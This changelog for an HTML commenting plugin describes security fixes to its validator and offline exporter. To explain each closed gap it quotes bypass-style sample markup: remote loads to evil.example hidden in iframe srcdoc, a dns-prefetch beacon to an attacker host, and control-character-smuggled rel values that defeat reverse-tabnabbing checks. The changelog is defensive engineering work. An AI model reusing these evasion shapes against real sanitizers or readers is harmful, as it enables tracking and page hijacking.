# Changelog

All notable changes to the `commentable-html` plugin are documented here. The format is based on
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and versions follow
[Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [1.747.0] - 2026-08-05

### Changed

- An offline export no longer DROPS the nested document it removes from an `<iframe srcdoc>`: it
  keeps that markup beside the emptied frame as escaped inert text, in a collapsed `<details>`
  block. The clear-outright rule that settled issues #996 and #1080 answered for the AUTHOR - an
  offline export is a derived artifact, so the source file still carries the `srcdoc` - and never
  for the RECIPIENT, who holds only the export and met a frame that rendered nothing, with no toast
  behind it and no note in the file. The middle option between clearing and sanitizing costs
  nothing the rejected sanitizer cost: it needs only ESCAPING on the exporter side (no second
  nested-document parser, so the drift argument does not apply), NOTHING on the gate side (the
  presence rule is unchanged, so the exporter and offline `--strict` still agree by construction),
  and it lands content both sides already read as text. The block is `cm-skip`, exactly like every
  other layer-injected node inside the content root, so it stays out of the section-hash,
  document-hash, anchor and selection walks on both the runtime and the Python side - an export
  cannot shift its own section hashes, flip an already-reviewed section to "changed", or invalidate
  the validated stamp it carries. (It also means a Markdown export omits the block, which loses
  nothing: an `<iframe>` has no Markdown representation either.) The placement rule is one
  sentence - the block goes where the FRAME is, so it is visible to exactly the reader the nested
  document was visible to, which is what settles the `<template>`- and `<noscript>`-parked cases in
  both directions. Bounds keep it from adding content where none was lost: an EMPTY or
  whitespace-only `srcdoc` gets no block, a frame in a FOREIGN namespace (an `<iframe>` inside
  `<svg>`, which renders nothing in any browser) gets none either, a frame inside a `<p>` anchors
  its block after that paragraph so the export stays serialize/reparse stable (and that walk stops
  at the first non-HTML ancestor, so a frame inside `<foreignObject>` keeps its block inside the
  graphic), two frames in one paragraph keep their source order rather than coming out reversed,
  a frame that did not render (it or an ancestor carries `hidden`) keeps a block that does not
  render either, and the text is never capped or truncated - the collapsed `<details>` bounds the
  LAYOUT instead,
  and the only things that reach the text are two normalizations that exist so the export is a
  fixed point (CR/CRLF to LF, and the file-wide blank-line collapse every offline export already
  applies to an authored `<pre>` as well). What counts as "whitespace-only" is a literal ASCII
  class shared by the exporter and the validator, because JS `trim()` and Python `str.strip()`
  disagree in both directions. Re-exporting an already-exported file is idempotent by construction,
  since the first export removed the attribute the second would read. The export toast now carries
  both counts - how many frames were emptied, and how many kept their markup, the second read off
  the finished document by IDENTITY (never by walking the public `cmh-srcdoc-export` class, which a
  source can legitimately already carry) rather than banked as each block is inserted - and the
  CMH-VAL-24 authoring
  advisory says the markup survives as inert text rather than telling an author their content is
  removed outright, branching so it promises nothing for an empty value, which the exporter does
  not keep.

## [1.744.0] - 2026-08-05

### Fixed

- The self-contained guarantee now reaches inside an `<iframe srcdoc>` in shareable mode
  (CMH-VAL-25). Every resource rule reads ELEMENTS, and a `srcdoc` carries a whole document as an
  attribute VALUE, so the validator's tag index read that markup as attribute TEXT: an
  `<img src="https://evil.example/x.png">` was a hard error, while the byte-identical load written
  as `<iframe srcdoc="&lt;img src=https://evil.example/x.png&gt;">` passed `--strict` and the file
  was stamped `commentable-html-validated` - a recipient handed a document that fetches from a host
  in the very load set the stamp covers. (Shareable mode's enforced set is `img`, `script`,
  `iframe`, `link` and `base`; the wider media, CSS, form and meta-refresh set is checked in offline
  mode only, at the top level and inside a frame alike.) The nested value is now read as a FRAGMENT
  through the SAME shared
  tag index and judged by the SAME predicates as the top level (`img` `src`/`srcset`, `script`
  `src`/`href`/`xlink:href`, `iframe` `src`, a loading `link` `href`, and a nested `<base href>` on
  the stricter non-local-reference test), at the SAME severity element for element (a network
  `link` is a warning, as it is at the top level; everything else is an error), so a nested element
  gets exactly the verdict its top-level twin gets and there is no second notion of what a load is.
  Scanning the raw `srcdoc` text instead was rejected: it cannot tell an `<a href>`, a `data:` URI
  or a URL in prose from a load, so it would block benign nested markup. Unlike the offline
  `srcdoc` decision this carries no two-parser drift risk - shareable mode has no exporter strip
  pass, so the gate is the only implementation. The one deliberate strictness difference is the
  Chart.js CDN loader: the top-level exemption exists for a single documented opt-in, the
  loader that draws THIS document's canvas charts, and a copy inside a frame can never be that
  loader because a frame cannot draw into its host's canvas - so the exemption has nothing to
  exempt rather than being withheld. Offline mode is unchanged (it rejects a `srcdoc` on presence,
  which is stronger),
  parked frames (`<template>`, `<noscript>`, a self-closed foreign element) are judged alike, a
  frame inside a frame is walked to a bounded depth, and an unreadable nested fragment or nesting
  past that depth is reported rather than read as clean.

## [1.742.0] - 2026-08-05

### Fixed

- An export can no longer fail silently at any step of its click handler (CMH-EXP-23). The guard
  added for the canonical pass covered that one pass only; the rest of the handler still ran on
  lines that could unwind it - the state-baking prelude (`_applyWidgetLayoutToHtml` /
  `_applyChecklistStateToHtml` / `_applyNoteStateToHtml` / `_applyReviewStateToHtml`, each a
  `DOMParser` round-trip that can throw), the document build's own catch (which read `e.message`
  bare, so a throwable with no readable message produced an EMPTY toast and one whose `message`
  getter throws unwound the handler from inside the catch), and the download call itself
  (`new Blob([text])` plus `URL.createObjectURL`, which a multi-megabyte Offline export is the
  likeliest of all of them to fail). A throw from any of them ended the click with no file, no
  toast, and nothing a reader could tell apart from a click that never registered. All five export
  entry points that write a file - Shareable (`saveHtml`), the NonShareable Standalone branch
  (`saveStandalone`), Offline (`saveOffline`), Plain (`saveAsPlain`) and Markdown
  (`exportMarkdown`) - now report a failure at every one of those steps through one shared reporter
  that names the cause, says no file was written and that nothing in the document changed so a retry
  is safe, and leaves the full thrown value on the console; Markdown, which bakes no state, gets its
  own conversion message rather than being filed under a baking pass that never ran. A document
  build still shows the message its builder wrote for the reader, and only falls back to the shared
  report when there is no message to show - but it now goes out as the same assertive, long-duration
  toast as every other export failure, rather than with the 3s pacing of a confirmation. A failure to
  load the document's own base HTML - the first step of every handler - reports through the same
  path, carrying the thrown value, so that step can neither unwind the handler nor drop the cause. A download that throws no longer falls through to the success toast, so an export
  never claims a file it did not write, and both download helpers now revoke the object URL and
  remove their anchor if the throw lands after the URL exists - an anchor left in the document would
  otherwise be serialized into the base of every later export.


## [1.741.0] - 2026-08-05

### Fixed

- Every reader of a `rel` list - in the validator, the authoring tools, and the runtime itself - now
  tokenizes it the way HTML does rather than the way its own language does, so the gate's verdict,
  the tools' behavior, and the browser's reading of the same attribute agree (CMH-KQL-05,
  CMH-KIND-05, CMH-LINK-01). HTML splits a `rel` attribute on ASCII whitespace ONLY (tab, LF, FF,
  CR, space); Python's argument-less `str.split()` is Unicode-aware and additionally splits on the
  vertical tab U+000B, NBSP, and U+001C-U+001F, and a JS `\s` split additionally takes the vertical
  tab, NBSP and U+FEFF. Three consequences, all closed here:
  - `<a target="_blank" rel="noopener&#x0b;x">` passed the reverse-tabnabbing gate on a link whose
    single opaque relation a browser never matches - `window.opener` stayed exposed and the opened
    page could navigate the document the reader is looking at.
  - `<link rel="icon&#x0b;x">` satisfied the mandatory-favicon check with a link the browser never
    fetches, so the tab still showed the generic globe.
  - The render-time stamper that enforces `rel="noopener noreferrer"` on every author link opening
    a new tab read `rel="noopener&#x0b;x noreferrer&#x0b;y"` as already carrying both relations and
    stamped nothing, leaving the rendered document unprotected - the same hole in the layer that
    actually defends the reader, not just in the gate that warns the author. The stamp now ADDS the
    missing relations and never rewrites the author's own.
  All of them now read one tokenizer per language: the validator's `link_rel_tokens`, which the
  three egress readers already used, and the runtime's `_offlineLinkRelTokens`, pinned to it as
  text by the existing parity test. The authoring tools' favicon helper
  (`tools/authoring/_favicon.py`, which decides when `retrofit`/`upgrade` inject a favicon) reads
  the shared split through `tools/_browser_attrs.py`, so it keeps injecting exactly when the
  validator would warn.
- The same reverse-tabnabbing gate now reads the `target` the way a browser reads it, and asks the
  question that actually matters: does this target CREATE an auxiliary browsing context, whose
  `window.opener` points back at the document the reader is looking at (CMH-KQL-05)? HTML matches
  its four keywords ASCII case-insensitively and does NOT trim the value, so `_BLANK`, a padded
  ` _blank` and a NAME that resolves to nothing in the document all keep an opener. A Python `==`
  against the literal `_blank` saw none of them, so a `cmh-kql-run` link carrying no `rel` at all
  passed the gate in silence. A name that DOES resolve - an `<iframe name="win1">` in the same
  document - navigates a context that already exists and is exempt. That gate is the ONLY
  reverse-tabnabbing control on a run link, because CMH-KQL-01 places it inside
  `figcaption.cm-skip`, which both the render-time stamper and the `checks/links.py` new-tab check
  pass over.
## [1.737.0] - 2026-08-05

### Fixed

- A malformed `file:` companion reference on a NonShareable document is now reported as a
  validation FINDING instead of killing the validator. Two stages could throw on such a reference
  and neither was caught: `urlparse` VALIDATES a bracketed authority, so `file://[foo]/x`,
  `file://[127.0.0.1]/x` and the unclosed `file://[::1/x` raised `ValueError` on every platform,
  and `url2pathname` rejects an authority or path shape it cannot map - as
  `OSError('Bad URL: //[||1]/dist/...')` for `file://[::1]/dist/commentable-html.js`, and as
  `IndexError` when the drive delimiter leads the path (`file::/x`, `file:|x`) - so either ended
  `validate()` with a raw traceback. Every fail-closed caller (`retrofit.py`,
  `content_replace.py`, `chart_block.py`, `finalize.py`) then saw that traceback where a finding
  belongs, and a validator that crashes on hostile or merely odd input is strictly worse than one
  that reports the problem. The finding names the real problem - the reference does not resolve to
  a local file path - rather than blaming the scheme, which is the one part of such a reference
  that is right. The authorities that name no path (an IPv6 literal, a `host:port`, and its `|`
  spelling, which the resolver reads as the same drive delimiter as `:`, whether written as the
  host or a slash deeper as `file:////host:8080/x`) are settled by the resolver itself rather than
  by the platform's `url2pathname`, which raises on Windows, hands the string back unchanged on
  POSIX, and mangles a `host:port` into the bogus drive path `T:8080\x`, so their verdict is now
  identical on both platforms. A Windows drive-letter prefix still resolves in every spelling the
  URL parser reads as a drive (`file://C:/dir/x.js`, `file://C|/dir/x.js`, and the separatorless
  `file://c:evil.example/x`), so nothing that validated before is newly rejected.
- A NonShareable companion reference is now CLASSIFIED (remote, non-`file` scheme, drive letter) on
  the reference as the URL parser reads it, the same value the path resolver uses. Those tests are
  anchored, so reading the raw attribute let the parser's own leading C0-or-space padding hide the
  scheme from all of them: `<link href=" https://cdn.example.com/commentable-html.css">` and
  `<script src=" vscode://x.js">` fell through to the relative-path branch and were reported as a
  missing companion file instead of as the remote or wrong-scheme reference the browser actually
  fetches.

## [1.735.0] - 2026-08-05

### Fixed

- The validator's layer views are namespace-aware, so an element merely NAMED after an HTML one no
  longer stands in for it (CMH-VAL-19). A browser does not RUN a MathML `<script>`: an element
  named `script` in the MathML namespace is an ordinary unknown foreign element. Filed into the
  layer views by TAG NAME alone, a bootstrap watchdog written inside `<math>` satisfied the
  NonShareable watchdog check while the runtime never booted, and a companion `<link>` or
  `<script src>` written there decided the document mode and satisfied "the stylesheet/runtime is
  here" while the layer never loaded - the validator asserting a guarantee the browser does not
  provide, with no `<template>` involved anywhere. The insertion namespace now rides along into
  `_DocParser._record()` and onto every `<script>`/`<style>` capture, and the rule applied is the
  browser's rule PER NAMESPACE rather than "reject every foreign namespace": the layer tag and id
  views take HTML-namespace elements only (a browser loads a stylesheet only from an HTML `<link>`,
  honors `src` only on an HTML `<script>` - an SVG script loads from `href`/`xlink:href` and MathML
  defines no script at all - and the runtime reveals `#cmhAssetBanner` through `.hidden`, an
  HTMLElement property whose UA `[hidden]` rule is namespace-scoped), while the bootstrap watchdog
  token is still accepted from an SVG `<script>`, because a browser really does run one. `all_ids`
  stays namespace-blind, because `getElementById` itself is.
- The same fix closes two neighbouring divergences in the foreign-content bookkeeping the new
  gates rest on (CMH-VAL-21). The `annotation-xml` `encoding` attribute is now matched EXACTLY and
  ASCII-case-insensitively, with no trimming, as HTML5 compares it: a padded `encoding=" text/html"`
  is NOT an HTML integration point, and treating it as one reopened this very bypass through one
  space. And the MathML `mglyph`/`malignmark` carve-out now applies only under a MathML TEXT
  integration point, not under an `annotation-xml[encoding=text/html]` HTML integration point,
  where a browser inserts them in the HTML namespace - keying it on the generic integration flag
  consumed a whole `<![CDATA[` section a browser reads as a bogus comment, hiding live markup from
  every check built on the parse. Finally, the bootstrap watchdog token is only credited to a
  script whose INLINE BODY runs: a browser that fetches an external script ignores the element's
  own child text, so a token folded into a `<script src>` (or an SVG `<script href>` /
  `<script xlink:href>`, since an SVG script has no `src`) no longer satisfies the check.



## [1.733.0] - 2026-08-05

### Fixed

- A `srcset` candidate is now tokenized the way HTML's own parser does, on all THREE surfaces that
  read one - the offline export strip, the strict validator, and the deck gate - so a `data:` URL
  carrying a comma is read as ONE candidate instead of being split into two (CMH-OFFLINE-04,
  CMH-VAL-08, CMH-DECK-04). The shared candidate reader used to take the UNION
  of a comma split and an ASCII-whitespace split, on the reasoning that a descriptor (`1x`, `320w`)
  can never match the network predicate so over-inclusion cost nothing. A `data:` URL breaks that
  reasoning, because a comma is legal inside one - it separates the media type from the data - so
  `srcset="data:text/plain,https://example.com/payload 1x"` was cut into `data:text/plain` and
  `https://example.com/payload`, and the second half matched. Both implementations agreed, so this
  was never a gate/strip drift, and it was fail-CLOSED (an over-strip and an over-rejection, never
  a missed load) - but an offline export cleared a `srcset` that reaches no network at all, and
  `--strict` rejected a document with no egress. The exporter's `_offlineSrcsetCandidateUrls` and
  the validator's `srcset_candidate_urls` now both run HTML's candidate state machine (skip a run
  of ASCII whitespace and commas, collect a run of non-whitespace as the URL, strip that URL's
  trailing commas or run the descriptor tokenizer forward to the first comma outside parentheses),
  moved in one change so the gate can never reject a file the exporter just produced. The cases the
  union existed for are unchanged: a comma inside a network URL run still belongs to the URL
  (`https://,host/x.png` really is requested), and a comma that FOLLOWS the descriptors still
  separates two candidates even with no space around it. A comma that abuts the URL run is not a
  separator - `a.png,b.png` is one relative reference a browser never fetches off-host - and one
  step of HTML's algorithm is deliberately skipped: descriptor VALIDATION, so a candidate whose
  descriptors HTML rejects outright (`https://host/x.png 1x 2x`) is still reported here. That
  over-detection is the fail-closed direction and is kept rather than holding a second, larger
  state machine identical across two languages.
- The deck gate (`deck/deck_validate.py`) now calls that same shared reader instead of its own
  third comma split, so a deck whose only "remote" reference was the tail of a `data:` URL is no
  longer rejected, and the deck gate cannot disagree with the other two surfaces about where a
  candidate begins and ends (CMH-DECK-04). Two OTHER deck checks read the same candidate list, so
  they narrowed with it: a `javascript:`/`data:text/html` scheme or a `../` reference buried in
  parenthesised or unclosed-paren DESCRIPTOR text is no longer reported, because HTML puts no
  candidate boundary there and a browser acts on none of it. A genuine comma-separated candidate
  carrying one is still rejected, and both directions are now pinned by tests.


### Added

- The validator now tells an author, while the document is still being authored, that an
  `<iframe srcdoc>` will not survive Export Offline (CMH-VAL-24). An offline export removes the
  nested document outright, and until now an author only met that in a transient toast after the
  export had already emptied the frame. It is an ADVISORY (CMH-VAL-18), so it is always reported
  but never fails `--strict`, never withholds the `commentable-html-validated` stamp and never
  blocks a fail-closed caller such as `retrofit`: it reports what a different mode's export would
  REMOVE, and blocking would have made deleting the nested document the only route to a clean
  handoff - the very loss the notice exists to announce. That is scoped to the content-loss
  question and is deliberately not a ruling that a nested document is safe outside offline mode;
  no check can see inside an attribute value, a gap that predates the notice and is tracked as
  issue #1125. It is a presence
  test, exactly like the offline-mode error it complements, so nothing parses the nested document
  and the exporter and the strict gate still agree by construction; it names a `<template>`-parked
  frame, a `<noscript>` fallback and a self-closed foreign element the same way the export will
  really empty them, and an offline document reports the error alone so the two never
  double-report.

### Changed

- Recorded the decision behind that removal in the spec rather than leaving it as an omission
  (CMH-OFFLINE-04, CMH-SEC-06). Sanitizing the nested document instead of clearing it was
  prototyped on an abandoned branch, weighed, and rejected: it needs two independent recursive
  parsers - the exporter's browser DOM and the validator's pure-Python tokenizer - to agree at
  every depth on
  serialization, doctype reconstruction and rendering mode, fixed-point settling under
  serialize-then-reparse, and one shared parse budget; the content-preserving precedents in this
  layer are all edits inside a document both sides already parse; a value that will not settle
  still has to be removed, so sanitizing would trade a deterministic rule for parser-quirk
  roulette; and the author keeps the content regardless, since the export is a derived artifact.
  That last ground answers for the author and not for the recipient of an export, so the row also
  records the cheap middle option it does not take here - having the export replace the emptied
  frame with the nested markup as escaped inert text - as an open follow-up rather than a settled
  non-goal.


## [1.731.0] - 2026-08-05

### Fixed

- An offline export no longer ACTIVATES a `<noscript>` fallback the document keeps in its HEAD.
  A head `<noscript>` is not an ordinary element to a scripting-disabled parse: the "in head
  noscript" insertion mode allows only `link`, `style`, `meta`, `basefont`, `bgsound`, `noframes`,
  comments and whitespace, and anything else is a parse error that POPS the fallback and
  REPROCESSES that node - and everything after it - under the "in head" rules, so it becomes a head
  SIBLING (a `<script>`) or ends the head and lands in the body (a `<p>`). The export re-parses with
  `DOMParser` (scripting off), so the promotion happened INSIDE that parse, before any strip or
  ancestry check could see it, and a promoted node is indistinguishable in the DOM from one the
  author wrote as a sibling. Opening the SOURCE left a head `<noscript><script>` inert (with
  scripting on a fallback body is raw text); opening the EXPORT ran it. The exporter now reads the
  head fallbacks the way the reviewer's scripting-ENABLED tokenizer does - a start tag, then raw
  text to the first `</noscript` - in a PRE-PARSE pass over the source string, and drops whole any
  fallback the insertion mode would take apart, counting it in the download toast the way a
  straddling fallback and a dropped script already are. A head fallback carrying only what the mode
  allows is untouched, so this is not a blanket head-fallback removal, and a BODY fallback is
  unaffected (with scripting off it is transparent, and nothing is promoted out of it). Offline
  `--strict` rejects the same shape through a mirrored predicate, and the two are held to the same
  verdicts over a shared corpus by running the exporter's own scanner in node, so on every shape the
  corpus covers the exporter cannot emit a file its own gate refuses to certify. What both model is
  the parser's reading rather than the bytes': a U+0000 and a whitespace character reference are not
  content, a leading BOM is dropped by the file decode a real load performs, a tag name is folded
  ASCII-only (so `lin<U+212A>` is not a `link`), an `</br>` ends the head, an `<html>` or a nested
  `<noscript>` start tag inside a fallback is not a pop while a `<head>` is, and a fallback that
  never closes is cut to the end of the document rather than left standing. The exporter runs the
  pass to a FIXED POINT, because removing one fallback can splice the bytes around it into a head
  scope that reaches the next one (CMH-OFFLINE-05).


## [1.728.0] - 2026-08-05

### Fixed

- The authoring tools that rewrite a document in place now preserve the destination file's
  permissions. The new bytes are staged in a temp file, which POSIX creates as owner-only `0600`,
  and `os.replace` carries the STAGED inode's mode to the target - so upgrading, retrofitting, or
  re-theming a world-readable `0644` document silently narrowed it to `0600` and anyone it had
  been shared with could no longer open it. `upgrade.py`, `retrofit.py`, and `deck/deck_theme.py`
  now all give the staged file the destination's mode just before the swap, and the
  validated-temp plus atomic-replace guarantees are unchanged.
- The mode step lives in the shared `_atomic_io` helper (`preserve_mode`), so the tools that stage
  a document and swap it in - `upgrade.py`, `retrofit.py`, `deck/deck_theme.py`, and the shared
  `atomic_write` behind `content_replace.py`, `to_shareable.py`, `validate.py` and `finalize.py` -
  all answer this the same way.
  Only the `0777` permission bits are copied - a setuid/setgid/sticky bit is never applied to a
  freshly staged inode - and a destination that exists but cannot be statted is left alone, so a
  guess can never WIDEN a deliberately private file. A `--out` to a path that does not exist yet
  has no mode to preserve, so the transform tools pass their SOURCE document as the fallback
  rather than letting a process default widen it (and the result is intersected with what a plain
  create would produce, so it is never wider than the umask allows either). A failure to apply the
  mode never fails the write, but it is reported on stderr instead of silently landing the wrong
  permissions.
- `upgrade.py`, `retrofit.py`, and `deck_theme.py` now resolve the destination with `realpath`
  before staging and replacing, as `_atomic_io.atomic_write` already did. Writing through a
  symlink used to replace the LINK with a regular file and strand the real document with stale
  content; it now rewrites the document the link points at. A `retrofit.py --copy-assets` run
  still copies its companions beside the path the CALLER named, since bare-name refs resolve
  against the URL the document is opened by.
- Staged-file cleanup in those tools goes through `_atomic_io.quiet_remove`, which clears a
  read-only bit first, so a staged file that inherited a read-only destination's mode cannot leak
  on Windows.

## [1.726.0] - 2026-08-05

### Fixed

- The in-document comment dialog's action buttons now meet the repo-wide `>=44px` touch target on a
  phone viewport (`max-width: 640px`), in the note view (`Delete` / `Close` / `Edit`) and the edit
  view (`Cancel` / `Save`) alike (CMH-CORE-23). Both rows measured 33px tall at a 320x720 viewport -
  the last controls in the dialog a thumb had to aim at, since its formatting toolbar (CMH-RICH-20)
  and the sidebar card's actions were already enlarged. With the shipped labels the enlarged row
  still fits one line at 320px in every density scale, so the layout is unchanged; wrapping is a
  fallback for a row that no longer fits (a localized label set, a larger host root font), and the
  wrapped lines take a roomier row gap - in the same absolute unit as the touch target - so a
  `Delete` pushed onto its own line keeps a deliberate gap from the button below it rather than
  sitting a thumb-slip away. The confirmation `Delete` goes through (CMH-CORE-22) is unchanged.

## [1.723.0] - 2026-08-05

### Added

- The validator now tells an author, while the document is still being authored, that an
  `<iframe srcdoc>` will not survive Export Offline (CMH-VAL-24). An offline export removes the
  nested document outright, and until now an author only met that in a transient toast after the
  export had already emptied the frame. It is an ADVISORY (CMH-VAL-18), so it is always reported
  but never fails `--strict`, never withholds the `commentable-html-validated` stamp and never
  blocks a fail-closed caller such as `retrofit`: it reports what a different mode's export would
  REMOVE, and blocking would have made deleting the nested document the only route to a clean
  handoff - the very loss the notice exists to announce. That is scoped to the content-loss
  question and is deliberately not a ruling that a nested document is safe outside offline mode;
  no check can see inside an attribute value, a gap that predates the notice and is tracked as
  issue #1125. It is a presence
  test, exactly like the offline-mode error it complements, so nothing parses the nested document
  and the exporter and the strict gate still agree by construction; it names a `<template>`-parked
  frame, a `<noscript>` fallback and a self-closed foreign element the same way the export will
  really empty them, and an offline document reports the error alone so the two never
  double-report.

### Changed

- Recorded the decision behind that removal in the spec rather than leaving it as an omission
  (CMH-OFFLINE-04, CMH-SEC-06). Sanitizing the nested document instead of clearing it was
  prototyped on an abandoned branch, weighed, and rejected: it needs two independent recursive
  parsers - the exporter's browser DOM and the validator's pure-Python tokenizer - to agree at
  every depth on
  serialization, doctype reconstruction and rendering mode, fixed-point settling under
  serialize-then-reparse, and one shared parse budget; the content-preserving precedents in this
  layer are all edits inside a document both sides already parse; a value that will not settle
  still has to be removed, so sanitizing would trade a deterministic rule for parser-quirk
  roulette; and the author keeps the content regardless, since the export is a derived artifact.
  That last ground answers for the author and not for the recipient of an export, so the row also
  records the cheap middle option it does not take here - having the export replace the emptied
  frame with the nested markup as escaped inert text - as an open follow-up rather than a settled
  non-goal.

## [1.722.0] - 2026-08-05

### Fixed

- The validated stamp is now written ATOMICALLY. `validate.py` stamped a strict-clean document by
  reopening it with mode `w`, which truncates the file before the stamped bytes exist, so an
  interrupted or failing write (a full disk, a killed run, an encoding error) destroyed a document
  that had just PASSED validation - and, because stamping is best-effort, the loss was reported as
  nothing worse than a NOTE. The stamp, and the single write `finalize.py` makes, now stage the new
  bytes in the target's own directory and swap them in with `os.replace` (the shared
  `_atomic_io.atomic_write` the migration tools already use), so a failed write leaves the original
  bytes untouched and cleans up after itself. A partial install whose `validate.py` cannot import
  `_atomic_io` refuses to stamp rather than falling back to a truncating write.

## [1.721.0] - 2026-08-05

### Fixed

- `Export Offline` now removes a `<link rel="preconnect">` or `<link rel="dns-prefetch">`
  UNCONDITIONALLY, whatever its `href` parses as, and offline `--strict` rejects one that survives
  (CMH-OFFLINE-04). Both relations were removed only when their `href` was a network URL by the
  per-resource predicate, so a hint in a scheme that predicate reads as local -
  `<link rel="dns-prefetch" href="ftp://evil.example">` - rode into a zero-network export, as did a
  relative or same-document one. A DNS lookup for an attacker-chosen host from the reader's machine
  is a beacon: it reveals that the document was opened, from which resolver, and when. The
  predicate is the wrong LAYER for these two rather than merely too narrow: their leak is a name
  RESOLUTION rather than a fetch, so the TCP-listener probe that settled the predicate's scheme
  boundary structurally cannot see one. That was measured rather than assumed - a DNS-capable
  observer (a Chromium netlog, read as host-resolver EVENTS rather than as raw text) saw ZERO
  resolver activity for a `preconnect`/`dns-prefetch` host in any scheme, the `http:`/`https:`
  CONTROL hints included, from a `file:` and an `http:` document alike and with the speculative
  machinery deliberately re-enabled, while an ordinary image reference to an http host in the same
  document did produce a resolver job. A control that measures zero cannot license a boundary, so
  no scheme is evidenced inert and the hints go outright: unlike a stylesheet or an icon they show
  a reader nothing, so removing one loses no content. What goes is the HINT rather than the
  ELEMENT - a `rel` that mixes a hint with a content relation keeps its other relations, so an
  `alternate` or `stylesheet` reference a reader uses is never deleted silently, and what remains
  is still judged by the network-href pass as the relation it also is. Both sides read the `rel`
  list through the shared ASCII tokenizer and one shared relation set, so the strip and the gate
  agree by construction rather than by two predicates staying in step, and the measurement is
  committed as a spec that re-runs on every CI pass.

## [1.717.0] - 2026-08-05

### Fixed

## [1.715.0] - 2026-08-05

### Fixed

- The validator now reads a `file://` companion reference's HOST the way the URL parser reads it,
  so a NonShareable document whose companion refs are written in a percent-encoded spelling of
  `localhost` validates cleanly. The parser percent-decodes a file host and maps it through
  domain-to-ASCII before the file-host state empties the exact string `localhost`, but the
  resolver compared the raw, still-encoded host to the literal - so `file://local%68ost/...` fell
  through to the authority branch, resolved to a bogus UNC path, and reported a companion file
  that was right there on disk as missing. The ref now also goes through the same input cleanup
  the network-URL predicate uses, so a BACKSLASH host terminator (`file://localhost\x`, which the
  parser ends at the `\` exactly as at a `/`) is local too. A TRAILING DOT deliberately keeps a
  real authority (`file://localhost./x` is the SMB path `\\localhost.\x`), matching the
  network-URL predicate's decision, and the two are now pinned to agree about the `localhost`
  spelling - IDNA/UTS-46 spellings included, which both sides read as an authority (the accepted
  over-detection the network-URL predicate already records) (CMH-VAL-05).

## [1.711.0] - 2026-08-05

### Fixed

- The validator now resolves the layer descriptor the way the runtime and the exporter do, so a
  document whose ONLY `commentableHtmlLayer` descriptor sits inside the content root is reported as
  missing a descriptor instead of validating completely clean (CMH-VAL-19). The layer deliberately
  reads its own reserved blocks OUTSIDE the content root (`cmhLayerBlocks`, so that "a
  content-region decoy must not be able to declare what this document IS") and every export refuses
  such a file outright, but the validator took the first `<script id="commentableHtmlLayer">`
  anywhere in the parse - the parser computed the content-region flag per capture and then dropped
  it. A document with a live descriptor moved inside `#commentRoot` therefore got a clean bill of
  health for a file the layer resolves no descriptor for and no export will produce, and a decoy
  placed there ahead of the real descriptor decided the document's declared mode - the one value
  that now keys the whole offline rule set, and one a decoy can set to the perfectly VALID
  `"offline"` without raising any mode error at all. The flags ride along to the flushed script and
  the descriptor is resolved through them, on the boundary `cmhLayerBlocks` actually tests: the
  whole `#commentRoot` SUBTREE, not just the part between the CONTENT markers, so a descriptor
  parked inside the root but ahead of the BEGIN marker (or past the END marker) is caught too. An
  absent flag fails CLOSED. The root subtree contains the authored region, so an authored
  DEMONSTRATION of the markup in prose is still content and the real descriptor in the head is
  still read, and the missing-descriptor error now says WHY.

## [1.710.0] - 2026-08-05

### Fixed

- A NonShareable document that carries offline chart snapshots is no longer read one way by the
  runtime and another by the validator. A `data-cm-offline-chart` image marks a chart a
  self-contained offline document snapshotted (a legacy Offline export produced them; the current
  export inlines Chart.js and keeps the live canvas), so a document whose layer lives in companion
  files can never be one: the snapshot there is a contradiction rather than evidence of offline
  mode. The strict validator now refuses that shape (the "snapshots force mode offline"
  consistency rule used to sit in the non-NonShareable branch alone, so the shape drew no mode
  error at all), and reports it alongside a wrong declared mode rather than one problem per run.
  `isOfflineDocument()` stops treating the snapshot signal as evidence once the layer is detected
  loading from companion files, or the descriptor declares either spelling of the companion-file
  mode. Both sides now also read the snapshot at the same scope - inside `#commentRoot` - so an
  attribute in host chrome outside the content root no longer fails a document the runtime would
  never have read as offline. Nothing else moves: a self-contained document that declares no mode
  still falls back to the snapshot signal, a Shareable document carrying snapshots still fails the
  `mode must be "offline"` rule, and an Offline document carrying them stays clean.

## [1.702.1] - 2026-08-05

### Fixed

- The offline strip no longer deletes a benign script because a local binding's name happens to
  contain a non-ASCII letter (CMH-OFFLINE-05). The scripted-navigation scan decides where a sink
  can start by looking for an identifier BOUNDARY in front of it, and that class was ASCII-only,
  so any identifier character outside ASCII read as a boundary: a purely local
  `<non-ASCII letter>location.href = <url>` - which navigates nothing - was treated as the
  document's own `location`, so Export Offline deleted the whole script and `validate.py --strict`
  rejected a file that navigates nowhere. That is the false-positive direction this check exists to
  avoid, because it silently destroys an author's content. Both engines now spell the class as the
  COMPLEMENT of the boundary characters (every ASCII character that cannot appear in an identifier
  EXCEPT `.`, plus the exact whitespace set the scan already uses), byte-identically, because `\w`
  means different things in the two engines and Python has no Unicode property escape. The `.`
  exception is unchanged and load-bearing: a member-expression dot has to CONTINUE the chain, so
  that `cfg.location.href = <url>` stays some other object's `location` rather than the document's
  sink. The complement spelling also settles the astral case in one rule: a supplementary code
  point is a surrogate PAIR to JavaScript's `charAt` and a single code point to Python, and neither
  reading is a boundary character now. Non-ASCII WHITESPACE is deliberately still a boundary, so a
  real sink one exotic space into a script is seen exactly as before, and the ASCII-only case fold
  beside it is untouched - it is what stops Python's Unicode folding from folding a dotless i or a
  long s ONTO `location`, which is the opposite failure. Widening the identifier side can only ever
  remove matches, never invent one, so no benign document can start being deleted by this change.
  The identifier/boundary split is now ENUMERATED over every code point in both engines rather than
  sampled, because a sample corpus catches the whitespace carve-out being deleted wholesale but not
  one range going missing.

## [1.702.0] - 2026-08-05

### Fixed

- The offline shadow rule now decides on the SCRIPT'S OWN DECLARATIONS instead of a bounded
  character window over raw source, so it stops deleting scripts that navigate nothing
  (CMH-OFFLINE-05). The window could not see an arrow parameter, a method or `constructor`
  shorthand, a generator, a nested destructuring or a default that spent a `}`, `]` or `)`
  inside it, a comment between `catch (` and the name, a non-ASCII function name, or any binding
  more than 400 characters into the list - every one of those made `Export Offline` drop an
  author's script whole and made `validate.py --strict` reject the file the exporter had just
  written. It also read a `location` merely MENTIONED in a comment, a string or a parameter
  default as a declaration, which suppressed a real unprefixed sink beside it. The rule is now a
  single left-to-right tokenizing pass (comments, string and template literals and regex literals
  skipped; declaration lists, parameter lists and destructuring patterns tracked as binding
  contexts; property keys and default-value expressions excluded), mirrored helper for helper in
  the exporter and the strict validator and pinned in both engines. It stays linear on adversarial
